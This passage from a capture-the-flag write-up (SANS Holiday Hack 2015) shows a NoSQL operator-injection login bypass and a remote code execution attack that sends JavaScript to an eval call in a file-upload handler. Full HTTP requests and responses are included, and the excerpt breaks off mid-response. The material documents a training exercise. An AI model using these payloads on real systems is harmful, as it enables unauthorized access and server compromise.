      &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;cookie&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;sessionid&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;sessionid&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
      &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;writeHead&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;301&lt;/span&gt;&lt;span class="p"&gt;,{&lt;/span&gt; &lt;span class="nx"&gt;Location&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;});&lt;/span&gt;
      &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;end&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
  &lt;span class="p"&gt;});&lt;/span&gt;
&lt;span class="p"&gt;});&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We can see that the parameters &lt;code&gt;username&lt;/code&gt; and &lt;code&gt;password&lt;/code&gt; are not
converted to string before being used in the NoSQL query. This means that we
can send our login parameters in JSON, and they will automatically be converted
to a JavaScript object.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nf"&gt;POST&lt;/span&gt; &lt;span class="nn"&gt;/&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;52.64.191.71&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.5.0&lt;/span&gt;
&lt;span class="na"&gt;Accept&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;text/html,application/xhtml+xml,application/xml;q=0.9,*/\*;q=0.8&lt;/span&gt;
&lt;span class="na"&gt;Accept-Language&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3&lt;/span&gt;
&lt;span class="na"&gt;Accept-Encoding&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;gzip, deflate&lt;/span&gt;
&lt;span class="na"&gt;Referer&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;http://52.64.191.71/?logout=1&lt;/span&gt;
&lt;span class="na"&gt;Cookie&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;sessionid=9VdoAi2pOEvmdCfZz0y9&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;application/json&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;45&lt;/span&gt;

&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;username&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;admin&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;password&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;$gt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;}}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt; &lt;span class="m"&gt;301&lt;/span&gt; &lt;span class="ne"&gt;Moved Permanently&lt;/span&gt;
&lt;span class="na"&gt;X-Powered-By&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;GIYH::SuperGnome by AtnasCorp&lt;/span&gt;
&lt;span class="na"&gt;Set-Cookie&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;sessionid=5KriPZf9AP8l8MGBVpA8; Path=/&lt;/span&gt;
&lt;span class="na"&gt;Location&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;/&lt;/span&gt;
&lt;span class="na"&gt;Date&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Sun, 20 Dec 2015 22:44:35 GMT&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;0&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This request means that the username must be &amp;quot;admin&amp;quot;, and that the associated
password must be greater than an empty string. Since such a user exists, the
application considers that we provided valid credentials, and happily opens
an authenticated web session.&lt;/p&gt;
&lt;p&gt;We can then get the configuration file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nf"&gt;GET&lt;/span&gt; &lt;span class="nn"&gt;/files?d=gnome.conf&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;52.64.191.71&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.5.0&lt;/span&gt;
&lt;span class="na"&gt;Accept&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;text/html,application/xhtml+xml,application/xml;q=0.9,*/\*;q=0.8&lt;/span&gt;
&lt;span class="na"&gt;Accept-Language&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3&lt;/span&gt;
&lt;span class="na"&gt;Accept-Encoding&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;gzip, deflate&lt;/span&gt;
&lt;span class="na"&gt;Referer&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;http://52.64.191.71/files&lt;/span&gt;
&lt;span class="na"&gt;Cookie&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;sessionid=5KriPZf9AP8l8MGBVpA8&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt; &lt;span class="m"&gt;200&lt;/span&gt; &lt;span class="ne"&gt;OK&lt;/span&gt;
&lt;span class="na"&gt;X-Powered-By&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;GIYH::SuperGnome by AtnasCorp&lt;/span&gt;
&lt;span class="na"&gt;Date&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Sun, 20 Dec 2015 22:44:57 GMT&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;339&lt;/span&gt;

Gnome Serial Number: THX1138
Current config file: ./tmp/e31faee/cfg/sg.01.v1339.cfg
Allow new subordinates?: YES
Camera monitoring?: YES
Audio monitoring?: YES
Camera update rate: 60min
Gnome mode: SuperGnome
Gnome name: SG-03
Allow file uploads?: YES
Allowed file formats: .png
Allowed file size: 512kb
Files directory: /gnome/www/files/
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The flag for this SuperGnome is &lt;code&gt;THX1138&lt;/code&gt;
(&lt;a class="reference external" href="https://en.wikipedia.org/wiki/THX_1138"&gt;geeky reference&lt;/a&gt;).&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="id4"&gt;
&lt;h3&gt;&lt;a class="reference external" href="http://52.192.152.132"&gt;SuperGnome04&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;We can connect to this SuperGnome with our credentials (whew).
However, when we try to download the gnome.conf file from the
files tab, we get an error message:&lt;/p&gt;
&lt;img alt="sg04_download_fail.png" class="align-center" src="/images/sans-christmas-challenge-2015/sg04_download_fail.png" /&gt;
&lt;p&gt;Fortunately for us, this SuperGnome suffers from a remote code execution:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c1"&gt;// File www/routes/index.js, line 153&lt;/span&gt;
&lt;span class="c1"&gt;// FILES UPLOAD&lt;/span&gt;
&lt;span class="nx"&gt;router&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/files&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;upload&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;single&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;file&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;req&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;next&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;sessions&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;sessionid&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="nx"&gt;logged_in&lt;/span&gt; &lt;span class="o"&gt;===&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="nx"&gt;sessions&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;sessionid&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="nx"&gt;user_level&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;99&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="c1"&gt;// NEDFORD: this should be 99 not 100 so admins can upload&lt;/span&gt;
    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;msgs&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[];&lt;/span&gt;
    &lt;span class="nx"&gt;file&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;req&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;file&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;req&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;file&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;mimetype&lt;/span&gt; &lt;span class="o"&gt;===&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;image/png&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="nx"&gt;msgs&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;push&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Upload successful.&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="hll"&gt;      &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;postproc_syntax&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;req&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;body&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;postproc&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;      &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;File upload syntax:&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nx"&gt;postproc_syntax&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
      &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;postproc_syntax&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;none&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="nx"&gt;postproc_syntax&lt;/span&gt; &lt;span class="o"&gt;!==&lt;/span&gt; &lt;span class="kc"&gt;undefined&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nx"&gt;msgs&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;push&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Executing post process...&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;result&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="nx"&gt;d&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;run&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="hll"&gt;          &lt;span class="nx"&gt;result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;eval&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;(&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nx"&gt;postproc_syntax&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;)&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;        &lt;span class="p"&gt;});&lt;/span&gt;
        &lt;span class="c1"&gt;// STUART: (WIP) working to improve image uploads to do some post processing.&lt;/span&gt;
        &lt;span class="nx"&gt;msgs&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;push&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Post process result: &amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nx"&gt;result&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
      &lt;span class="p"&gt;}&lt;/span&gt;
      &lt;span class="nx"&gt;msgs&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;push&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;File pending super-admin approval.&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
      &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;msgs&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;msgs&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="nx"&gt;msgs&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;push&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;File not one of the approved formats: .png&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
      &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;msgs&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;msgs&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt;
    &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;render&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;index&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;title&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;GIYH::ADMIN PORT V.01&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;session&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;sessions&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;sessionid&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;res&lt;/span&gt; &lt;span class="p"&gt;});&lt;/span&gt;
  &lt;span class="nx"&gt;next&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;span class="p"&gt;});&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;When a file is uploaded, it's post-processed. To do so, the server
&lt;code&gt;eval&lt;/code&gt; s some code sent by us. Whoopsie! We can send arbitrary JavaScript
code, and it will be executed by the server. This means that we can send code
to read the configuration file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nf"&gt;POST&lt;/span&gt; &lt;span class="nn"&gt;/files&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;52.192.152.132&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.5.0&lt;/span&gt;
&lt;span class="na"&gt;Accept&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;text/html,application/xhtml+xml,application/xml;q=0.9,*/\*;q=0.8&lt;/span&gt;
&lt;span class="na"&gt;Accept-Language&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3&lt;/span&gt;
&lt;span class="na"&gt;Accept-Encoding&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;gzip, deflate&lt;/span&gt;
&lt;span class="na"&gt;Referer&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;http://52.192.152.132/files&lt;/span&gt;
&lt;span class="na"&gt;Cookie&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;sessionid=X7VWEHkmmlBfutfSWIKF&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;multipart/form-data; boundary=---------------------------1090026508808451371305736143&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;368&lt;/span&gt;

-----------------------------1090026508808451371305736143
Content-Disposition: form-data; name=&amp;quot;postproc&amp;quot;

require(&amp;#39;fs&amp;#39;).readFileSync(&amp;#39;/gnome/www/files/gnome.conf&amp;#39;, &amp;#39;utf8&amp;#39;, function (err, data) {})
-----------------------------1090026508808451371305736143
Content-Disposition: form-data; name=&amp;quot;file&amp;quot;; filename=&amp;quot;bar.png&amp;quot;
Content-Type: image/png

foo

-----------------------------1090026508808451371305736143--
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt; &lt;span class="m"&gt;200&lt;/span&gt; &lt;span class="ne"&gt;OK&lt;/span&gt;
&lt;span class="na"&gt;X-Powered-By&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;GIYH::SuperGnome by AtnasCorp&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;text/html; charset=utf-8&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;4208&lt;/span&gt;
&lt;span class="na"&gt;ETag&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;W/&amp;quot;1070-Jo7i+NGHd32e2cYWZTjmCQ&amp;quot;&lt;/span&gt;
&lt;span class="na"&gt;Date&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Sat, 26 Dec 2015 23:41:46 GMT&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;

&lt;span class="cp"&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;&lt;span class="nt"&gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;&lt;/span&gt;GIYH::ADMIN PORT V.01&lt;span class="nt"&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
[snip]
&lt;span class="nt"&gt;&amp;lt;ul&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;nav navbar-nav&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&amp;lt;li&amp;gt;&amp;lt;a&lt;/span&gt; &lt;span class="na"&gt;href=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;Home&lt;span class="nt"&gt;&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;&amp;lt;li&amp;gt;&amp;lt;a&lt;/span&gt; &lt;span class="na"&gt;href=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/cameras&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;Cameras&lt;span class="nt"&gt;&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;&amp;lt;li&amp;gt;&amp;lt;a&lt;/span&gt; &lt;span class="na"&gt;href=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/files&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;Files&lt;span class="nt"&gt;&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;&amp;lt;li&amp;gt;&amp;lt;a&lt;/span&gt; &lt;span class="na"&gt;href=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/gnomenet&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;GnomeNET&lt;span class="nt"&gt;&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;&amp;lt;li&amp;gt;&amp;lt;a&lt;/span&gt; &lt;span class="na"&gt;href=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/settings&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;Settings&lt;span class="nt"&gt;&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;&amp;lt;li&amp;gt;&amp;lt;a&lt;/span&gt; &lt;span class="na"&gt;href=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/?logout=1&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;Logout&lt;span class="nt"&gt;&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;&amp;lt;/ul&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;/nav&amp;gt;&amp;lt;div&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;jumbotron&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&amp;lt;h1&amp;gt;&lt;/span&gt;Files&lt;span class="nt"&gt;&amp;lt;/h1&amp;gt;&amp;lt;p&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;Upload successful.&lt;span class="nt"&gt;&amp;lt;/p&amp;gt;&amp;lt;p&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;Executing post process...&lt;span class="nt"&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;p&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;Post process result: Gnome Serial Number: BU22_1729_2716057
Current config file: ./tmp/e31faee/cfg/sg.01.v1339.cfg
Allow new subordinates?: YES
Camera monitoring?: YES
Audio monitoring?: YES
Camera update rate: 60min
Gnome mode: SuperGnome
Gnome name: SG-04
Allow file uploads?: YES
Allowed file formats: .png
Allowed file size: 512kb
Files directory: /gnome/www/files/
